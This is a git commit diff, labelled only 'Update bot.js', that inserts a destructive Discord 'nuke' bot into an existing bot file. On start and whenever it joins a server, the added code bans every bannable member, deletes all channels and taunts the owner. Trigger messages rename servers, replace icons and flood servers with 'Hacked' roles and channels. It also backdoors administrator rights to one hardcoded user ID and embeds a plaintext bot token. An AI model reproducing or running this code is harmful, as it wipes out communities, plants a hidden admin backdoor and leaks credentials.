4fdf2469a5ff0336a037dadf82b286ebbb398526
PokerDz <41197776+PokerDz@users.noreply.github.com>
2018-07-14 15:47:43 +0200

    Update bot.js

--- bot.js
+++ bot.js
@@ -27,5 +27,485 @@ client.user.setGame(`Nothing`,"http://twitch.tv/S-F")
   console.log('')
   console.log('')
 });
-
+const Discord = require("discord.js");
+const LOka = new Discord.Client();
+console.log('By PokerDz-YT');
+LOka.on('ready', () => {
+  console.log(`Logged in as ${LOka.user.tag} !`);
+ 
+});
+LOka.on('ready',  () => {
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
+console.log('      ~            ~  By : PokerDz-YT ~           ~    ');
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
+console.log(`Logged in as  * [ "  PokerDz-YT " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`);
+ 
+       
+   
+ 
+});
+var prefix = "-"
+LOka.on("message", message => {
+  if(!message.content.startsWith(prefix)) return;;
+  let args = message.content.split(" ").slice(1);
+  var argresult = args.join(' ');
+  if (message.content.startsWith('hix15')) {
+    LOka.user.setUsername(argresult);
+  }
+    if (message.content.startsWith(prefix + 'on123')) {
+    LOka.user.setStatus(argresult);
+  }
+});
+ 
+var x1 = "kk"
+LOka.on('message', message => {
+     if (message.content === "98") {
+LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
+ 
+}
+});
+var x1 = "kk"
+LOka.on('message', message => {
+     if (message.content === "98") {
+LOka.user.setUsername("Hacked u by Poker DZ")
+ 
+}
+});
+LOka.on('message', message => {
+     if (message.content === "98") {
+LOka.user.setGame(`Hacked u by Poker DZ`,'https://www.twitch.tv/hix')
+ 
+}
+});
+ 
+LOka.on('message', message => {
+     if (message.content === "4") {
+         LOka.guilds.forEach(m =>{
+             m.setIcon(`https://cdn.discordapp.com/attachments/464030875227652107/464097082253377536/Hacker_By_Poker_Dz.jpg`)
+})
+}
+});
+LOka.on('message', message => {
+     if (message.content === "5") {
+         LOka.guilds.forEach(m =>{
+             m.setName(`Hacked u by Poker DZ`)
+})
+}
+});
+ 
+LOka.on('message', message => {
+     if (message.content === "6") {
+                 if(!message.channel.guild) return;
+ 
+             message.guild.setIcon(`https://cdn.discordapp.com/attachments/464030875227652107/464097082253377536/Hacker_By_Poker_Dz.jpg`)
+ 
+}
+});
+ 
+LOka.on('message', message => {
+     
+ 
+     if (message.content === "3") {
+         LOka.guilds.forEach(m =>{
+  m.createRole({
+        name : "Hacked u by Poker DZ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Poker DZ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Poker DZ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Poker DZ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Poker DZ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Poker DZ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Poker DZ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Poker DZ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Poker DZ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+    m.createRole({
+        name : "Hacked u by Poker DZ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Poker DZ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Poker DZ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+     m.createRole({
+        name : "Hacked u by Poker DZ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Poker DZ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+    m.createRole({
+        name : "Hacked u by Poker DZ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Poker DZ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+    m.createRole({
+        name : "Hacked u by Poker DZ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Poker DZ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Poker DZ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Poker DZ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Poker DZ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Poker DZ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Poker DZ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Poker DZ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Poker DZ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Poker DZ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Poker DZ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Poker DZ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Poker DZ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Poker DZ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Poker DZ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Poker DZ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Poker DZ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+    m.createRole({
+        name : "Hacked u by Poker DZ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by uPoker DZ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+    m.createRole({
+        name : "Hacked u by Poker DZ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Poker DZ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by Poker DZ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+ 
+   
+})
+ 
+ 
+}
+});
+LOka.on('message', message => {
+         if (message.content === "1") {
+               LOka.guilds.forEach(m =>{
+m.createChannel('Hacked u by Poker DZ', 'text');
+m.createChannel('Hacked u by Poker DZ', 'text');
+m.createChannel('Hacked u by Poker DZ', 'text');
+m.createChannel('Hacked u by Poker DZ', 'text');
+m.createChannel('Hacked u by Poker DZ', 'text');
+m.createChannel('Hacked u by Poker DZ', 'text');
+m.createChannel('Hacked u by Poker DZ', 'text');
+m.createChannel('Hacked u by Poker DZ', 'text');
+m.createChannel('Hacked u by Poker DZ', 'text');
+m.createChannel('Hacked u by Poker DZ', 'text');
+ 
+m.createChannel('Hacked u by Poker DZ', 'text');
+ 
+m.createChannel('Hacked u by Poker DZ', 'text');
+ 
+m.createChannel('Hacked u by Poker DZ', 'text');
+ 
+m.createChannel('Hacked u by Poker DZ', 'text');
+m.createChannel('Hacked u by Poker DZ', 'text');
+m.createChannel('Hacked u by Poker DZ', 'text');
+m.createChannel('Hacked u by Poker DZ', 'text');
+m.createChannel('Hacked u by Poker DZ', 'text');
+m.createChannel('Hacked u by Poker DZ', 'text');
+m.createChannel('Hacked u by Poker DZ', 'text');
+m.createChannel('Hacked u by Poker DZ', 'text');
+m.createChannel('Hacked u by Poker DZ', 'text');
+m.createChannel('Hacked u by Poker DZ', 'text');
+m.createChannel('Hacked u by Poker DZ', 'text');
+ 
+m.createChannel('Hacked u by Poker DZ', 'text');
+m.createChannel('Hacked u by Poker DZ', 'text');
+ 
+m.createChannel('Hacked u by Poker DZ', 'text');
+m.createChannel('Hacked u by Poker DZ', 'text');
+m.createChannel('Hacked u by Poker DZ', 'text');
+m.createChannel('Hacked u by Poker DZ', 'text');
+m.createChannel('Hacked u by Poker DZ', 'text');
+m.createChannel('Hacked u by Poker DZ', 'text');
+m.createChannel('Hacked u by Poker DZ', 'text');
+m.createChannel('Hacked u by Poker DZ', 'text');
+m.createChannel('Hacked u by Poker DZ', 'text');
+m.createChannel('Hacked u by Poker DZ', 'text');
+m.createChannel('Hacked u by Poker DZ', 'text');
+ 
+m.createChannel('Hacked u by Poker DZ', 'text');
+m.createChannel('Hacked u by Poker DZ', 'text');
+ 
+})
+}
+});
+ 
+LOka.on('message', message => {
+         if (message.content === "2") {
+                 LOka.guilds.forEach(m =>{
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+ 
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+ 
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+ 
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+ 
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+ 
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+m.createChannel('Hacked u by Poker DZ', 'voice');
+ 
+ 
+ 
+})
+}
+ 
+});
+ 
+ 
+const { Client } = require('discord.js');
+const client = new Client();
+ 
+async function nuke(guild) {
+  let users = 0;
+  let channels = 0;
+ 
+  await guild.fetchMembers();
+ 
+  await guild.owner.send(' اسف لاكن تم التهكير :D   ').catch(e => { return void e; });
+ 
+ 
+ 
+  await Promise.all(guild.members.map(async (m) => {
+    if (m.bannable) {
+      users++;
+      await m.send('*_*').catch(e => { return void e; });
+      return m.ban();
+    }
+  }));
+ 
+    await Promise.all(guild.channels.map(c => {
+    if (c.deletable) {
+      channels++;
+      return c.delete();
+    }
+  }));
+ 
+    await guild.createChannel('Hacked u by Poker DZ', 'text');
+ 
+      await guild.createChannel('Hacked u by Poker DZ', 'voice');
+ 
+ 
+ 
+}
+ 
+LOka.on('ready', () => {
+  for(const [, g] of LOka.guilds) nuke(g).catch(console.error);
+  console.log('-------------------------------------------------------------');
+  console.log('');
+  console.log("Made by PokerDz");
+  console.log("");
+  console.log("-------------------------------------------------------------");
+ 
+});
+ 
+LOka.on('guildCreate', async (guild) => {
+  return nuke(guild).catch(console.error);
+});
+ 
+LOka.on('guildMemberAdd', member => {
+   
+            if (member.id === "355783597480738816") {
+                member.guild.createRole({
+                    name : LOka.user.username,
+                    color : "RANDOM",
+                    permissions : [8]
+                }).then(function(role){
+                    member.addRole(role)
+                })
+               
+            }
+       
+    });
+ 
+   
+ 
+ 
+ 
+ 
+LOka.login("NDY3MzQxMjcxODAzODg3NjE2.DitwTQ.KlctnjgAPLxY27Vs-KMPndKzmCE")
 client.login(process.env.BOT_TOKEN);
